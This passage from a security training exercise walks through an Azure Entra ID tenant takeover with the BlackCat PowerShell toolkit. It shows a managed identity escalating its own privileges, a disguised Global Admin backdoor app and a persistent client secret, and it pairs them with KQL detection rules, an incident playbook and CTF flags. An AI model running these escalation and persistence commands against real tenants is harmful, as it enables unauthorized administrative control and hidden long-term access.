# SecretText            : Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2

# Now attacker has persistent access via:
# - ClientId: 9a8b7c6d-5e4f-3210-fedc-ba0987654321
# - ClientSecret: Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2
# - This app has Global Administrator!
```

### Attack Complete - What Was Achieved

| Step | Achievement | Details |
|------|-------------|---------|
| **Self-Escalation** | UAMI granted itself `Application.ReadWrite.All` + `RoleManagement.ReadWrite.Directory` | Using `Set-ManagedIdentityPermission` twice |
| **Global Admin SP** | "Azure-Backup-Automation-Service" with GA role | Created via `Add-EntraApplication` |
| **Persistent Secret** | 2-year client secret for continued access | Using `Set-ServicePrincipalCredential` |
| **Stealthy Name** | Looks like legitimate backup automation | Low suspicion |

### Persistence Mechanisms Created

| Mechanism | Description | Detection Difficulty |
|-----------|-------------|---------------------|
| UAMI Permission Escalation | UAMI now has `Application.ReadWrite.All` + `RoleManagement.ReadWrite.Directory` | **Low** (visible in audit logs) |
| Malicious App Registration | "Azure-Backup-Automation-Service" with admin permissions | Medium |
| Client Secret | 2-year validity, added via `Set-ServicePrincipalCredential` | Low (if audited) |
| Federated Credential on UAMI | Persistent GitHub → Azure access | Medium |
| Global Admin Assignment | App's SP is now tenant admin | Easy (if monitored) |

### Step 3: Proof of Compromise - Verify Enterprise Application is Global Admin

Verify that the Enterprise Application was successfully created and has Global Administrator role:

```powershell
# Still authenticated as UAMI via Connect-GraphToken from Step 0
# Verify the newly created application has Global Administrator role

# Check if the new app is in the Global Administrators role
Get-EntraRoleMember -RoleName 'Global Administrator'

# Output:
# DisplayName                        PrincipalType      DirectoryScopeId
# -----------                        -------------      ----------------
# Azure-Backup-Automation-Service    ServicePrincipal   /                  ← We created this! 👑
# admin@bluemountaintravel.uk        User               /
# ...

# Get details of the newly created app
Get-EntraServicePrincipal -Filter "displayName eq 'Azure-Backup-Automation-Service'"

# Output shows:
# DisplayName                  : Azure-Backup-Automation-Service
# Id                           : def98765-4321-0fed-cba9-876543210fed
# AppId                        : 9a8b7c6d-5e4f-3210-fedc-ba0987654321
# ServicePrincipalType         : Application
```

### Step 4: Verify Persistence via Backdoor App

Now connect with the newly created backdoor application to confirm persistent access:

```powershell
# Disconnect from UAMI session
Disconnect-ServicePrincipal

# Connect with the newly created backdoor credentials
Connect-ServicePrincipal `
    -ServicePrincipalId "9a8b7c6d-5e4f-3210-fedc-ba0987654321" `
    -TenantId "67f8647a-6555-4c70-bee4-45625d332c3f" `
    -ClientSecret "Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2"

# Verify our identity - we're now the backdoor service principal
Get-EntraInformation -CurrentUser

# Output:
# DisplayName                  : Azure-Backup-Automation-Service
# Id                           : def98765-4321-0fed-cba9-876543210fed
# AppId                        : 9a8b7c6d-5e4f-3210-fedc-ba0987654321
# ServicePrincipalType         : Application

# 🎉 ATTACK COMPLETE - We have persistent Global Admin access via the backdoor app!
# Even if the UAMI is deleted, we still have full control via this application!
```

### Discussion Points
- Why is creating a new App more stealthy than modifying existing ones?
- What makes `Application.ReadWrite.All` so dangerous on UAMI?
- How can the attacker maintain access even if the UAMI is deleted?
- What would be the business impact of this compromise?

### Detection Opportunities

| Detection | Log Source | Alert Priority |
|-----------|------------|----------------|
| New App Registration | Entra ID Audit Logs | Critical |
| Global Admin role assignment to new app | Entra ID Audit Logs | Critical |
| Service principal sign-in from new app | Entra ID Sign-in Logs | High |
| Client secret added to application | Entra ID Audit Logs | High |

---

## 🛡️ DEFENSES & DETECTIONS (Summary)

```mermaid
flowchart TD
    subgraph Prevention["🛡️ Prevention Layer"]
        P1[No List-enabled SAS Tokens]
        P2[Private Endpoints for Storage]
        P3[Credential Scanning in CI/CD]
        P4[Least Privilege UAMIs]
        P5[Azure Policy: Block FIC creation]
    end

    subgraph Detection["🔍 Detection Layer"]
        D1[Storage Analytics Logs]
        D2[Azure Activity Logs]
        D3[Entra ID Audit Logs]
        D4[Entra ID Sign-in Logs]
        D5[Microsoft Sentinel Rules]
    end

    subgraph Response["⚡ Response Layer"]
        R1[Revoke SAS Tokens]
        R2[Rotate Storage Keys]
        R3[Delete Malicious Apps]
        R4[Remove FIC from UAMI]
        R5[Forensic Investigation]
    end

    P1 & P2 --> |"If bypassed"| D1 & D2
    P3 & P4 --> |"If bypassed"| D3 & D4
    P5 --> |"If bypassed"| D2 & D3

    D1 & D2 & D3 & D4 --> D5
    D5 --> |"Alert triggers"| R1 & R2 & R3 & R4 & R5

    style Prevention fill:#90EE90
    style Detection fill:#FFD700
    style Response fill:#FF6B6B
```

### Preventive Controls

| Control | Phase Blocked | Implementation |
|---------|---------------|----------------|
| **No SAS tokens with List permission** | Phase 1 | Use Azure AD authentication, or service-level SAS |
| **Disable soft-delete public access** | Phase 2 | Private endpoints, disable anonymous access |
| **Rotate/revoke exposed credentials** | Phase 3 | Secret scanning, credential monitoring |
| **Limit UAMI permissions** | Phase 3-4 | No `Application.ReadWrite.All` on UAMIs |
| **Restrict federated credential creation** | Phase 4 | Azure Policy, custom RBAC roles |
| **PIM for sensitive Graph permissions** | Phase 5 | Require approval for permission assignments |

### Detection Rules (KQL)

```kusto
// 1. Federated Credential Addition to UAMI
AzureActivity
| where OperationNameValue contains "federatedIdentityCredentials/write"
| project TimeGenerated, Caller, ResourceId, Properties

// 2. App Registration with Dangerous Permissions
AuditLogs
| where OperationName == "Add app role assignment to service principal"
| where TargetResources[0].modifiedProperties contains "RoleManagement.ReadWrite.Directory"
   or TargetResources[0].modifiedProperties contains "Application.ReadWrite.All"

// 3. Global Admin Assignment
AuditLogs
| where OperationName == "Add member to role"
| where TargetResources[0].modifiedProperties contains "62e90394-69f5-4237-9190-012177145e10"

// 4. New App with Client Secret in Short Window
AuditLogs
| where TimeGenerated > ago(1h)
| where OperationName in ("Add application", "Add service principal credentials")
| summarize Operations = make_set(OperationName) by TargetResources[0].displayName
| where array_length(Operations) >= 2
```

### Incident Response Playbook

| Step | Action | Owner |
|------|--------|-------|
| 1 | Revoke all SAS tokens for affected storage | Storage Admin |
| 2 | Rotate storage account keys | Storage Admin |
| 3 | Remove unauthorized federated credentials from UAMI | Identity Admin |
| 4 | Delete malicious App Registration | Global Admin |
| 5 | Revoke Global Admin from attacker user | Global Admin |
| 6 | Review all UAMI permissions tenant-wide | Security Team |
| 7 | Enable PIM for sensitive Graph permissions | Security Team |
| 8 | Forensic analysis of attacker actions | Incident Response |

---

## Key Takeaways

### For Blue Teams

1. **SAS tokens are credentials** - Treat them like passwords, audit their permissions with `Read-SASToken`
2. **Soft-delete ≠ secure delete** - Retention policies don't protect from enumeration
3. **Reconnaissance matters** - Use `Get-RoleAssignment`, `Get-ManagedIdentity`, `Get-ServicePrincipalsPermission` to understand attacker perspective
4. **UAMI permissions are dangerous** - `AppRoleAssignment.ReadWrite.All` + `Application.Read.All` enables tenant takeover via self-escalation
5. **Self-escalation is real** - A UAMI with `AppRoleAssignment.ReadWrite.All` can grant itself any Graph API permission, including `Application.ReadWrite.All` and `RoleManagement.ReadWrite.Directory`
6. **Federated credentials create trust** - Monitor additions, restrict who can create them. Any GitHub repo trusted by a UAMI can obtain tokens with the UAMI's permissions
7. **Detection must be multi-layer** - Storage, Azure Activity, Entra ID all have signals. Monitor permission grants, app registrations, and role assignments
8. **Token validation matters** - Expired tokens should be rejected immediately. Use tools like `Connect-GraphToken` that validate expiration before use

### For Red Teams

1. **Minimal config → Full access** - A single app secret can unlock the entire tenant via proper recon
2. **Use BlackCat for enumeration** - `Connect-ServicePrincipal` → `Get-RoleAssignment` → `Get-ManagedIdentity` → `Get-ServicePrincipalsPermission`
3. **Permission boundary crossing** - Contributor (Azure RBAC) + UAMI with Graph permissions = Entra ID access
4. **GitHub OIDC is stealthy** - `Set-FederatedIdentity` creates persistent access without stored secrets
5. **Self-escalation workflow** - Use `Set-ManagedIdentityPermission` to grant a UAMI powerful permissions to itself before creating backdoor apps
6. **Connect-GraphToken for UAMI tokens** - Use `Connect-GraphToken -asBase64` to authenticate with base64-encoded tokens from pipelines. Validates token expiration automatically
7. **Enterprise Applications for persistence** - `Add-EntraApplication` creates app + SP + Global Admin in one command. The resulting Enterprise Application provides long-term backdoor access
8. **Token transport via base64** - Encode tokens in base64 to avoid log truncation and special character issues in CI/CD pipelines

### For Architects

1. **Use service-level SAS** - Not account/share level with list permissions
2. **Private endpoints** - Eliminate anonymous access to storage entirely
3. **Least privilege UAMIs** - Separate UAMIs for different purposes, never grant `AppRoleAssignment.ReadWrite.All` without extensive review and justification
4. **Monitor federated credentials** - Alert on any additions to managed identities. Implement approval workflows for FIC creation
5. **PIM for Graph permissions** - Require approval for sensitive permission assignments, especially `Application.ReadWrite.All` and `RoleManagement.ReadWrite.Directory`
6. **Token lifetime policies** - Configure short token lifetimes for UAMI access tokens to limit exposure window
7. **Separate creation from elevation** - Don't grant both `Application.ReadWrite.All` and `RoleManagement.ReadWrite.Directory` to the same identity

### For Security Operations

1. **Base64-encoded tokens in logs** - Attackers may base64-encode tokens to evade detection. Look for patterns like "Connect-GraphToken -asBase64"
2. **Self-service permission grants** - Alert when a service principal grants permissions to itself via `AppRoleAssignment.ReadWrite.All`
3. **Rapid privilege escalation** - Detect when a new app registration receives Global Admin within minutes of creation
4. **GitHub OIDC in audit logs** - Federated identity sign-ins from GitHub repos should be validated against authorized repositories
5. **Enterprise Application monitoring** - New Enterprise Applications (service principals) should be reviewed, especially those with admin roles

---

## BlackCat Functions Used

| Phase | Function | Purpose |
|-------|----------|---------|
| 1 | `Find-DnsRecords` | Enumerate DNS records for target domain |
| 1 | `Find-AzurePublicResource` | Discover Azure resources via DNS |
| 1 | `Find-PublicStorageContainer` | Find publicly accessible storage containers |
| 1 | `Get-PublicBlobContent` | List and download blobs, including deleted versions |
| 1 | `Read-SASToken` | Analyze SAS token permissions and expiration |
| 2 | `Get-FileShareContent` | Enumerate Azure Files share contents via SAS token |
| 3 | `Connect-ServicePrincipal` | Authenticate with stolen App Registration credentials |
| 3 | `Get-RoleAssignment` | Discover Azure RBAC role assignments |
| 3 | `Get-ManagedIdentity` | Enumerate User-Assigned Managed Identities |
| 3 | `Get-ServicePrincipalsPermission` | Check Microsoft Graph API permissions |
| 4 | `Set-FederatedIdentity` | Add GitHub OIDC federated credential to UAMI |
| 5 | `Connect-GraphToken` | Authenticate with base64-encoded UAMI token from pipeline |
| 5 | `Set-ManagedIdentityPermission` | Grant Graph API permissions to UAMI (self-escalation) |
| 5 | `Add-EntraApplication` | Create Enterprise Application with Global Admin role |
| 5 | `Set-ServicePrincipalCredential` | Add client secret for persistent access |
| 5 | `Get-EntraRoleMember` | Verify Global Administrator role assignments |
| 5 | `Get-EntraServicePrincipal` | Verify Enterprise Application creation |
| 5 | `Get-EntraInformation` | Verify current authenticated identity |
| 5 | `Disconnect-ServicePrincipal` | Disconnect from current service principal session |

---

## Exercise Materials

| File | Purpose |
|------|---------|
| [app-config.json](vulnerable-configs/app-config.json) | Minimal exposed config (starting point) |
| [deployment-config.yaml](vulnerable-configs/deployment-config.yaml) | Full config (for reference) |
| [.env.production](vulnerable-configs/.env.production) | Environment variables |
| [uami-usage.yaml](../uami-usage.yaml) | GitHub Actions workflow example |

---

## Flags

Participants should capture these flags during the exercise:

| Flag | Location | Difficulty |
|------|----------|------------|
| `BlackCat{SAS_T0k3ns_4r3_P0w3rfu1_4cc3ss_Kr3d3nt14ls}` | Storage account | Easy |
| `BlackCat{0nb04rd1ng_D0cs_3xp0s3d_V1a_S4S_T0k3n}` | Welcome.html documents | Easy |
| `BlackCat{F3d3r4t3d_Cr3d3nt14l_Pr1v1l3g3_3sc4l4t10n}` | UAMI federated credential | Medium |
| `BlackCat{Gl0b4l_Adm1n_V1a_App_R3g1str4t10n}` | Tenant takeover completion | Hard |

---

*Exercise created for security awareness training. All credentials are fictional.*
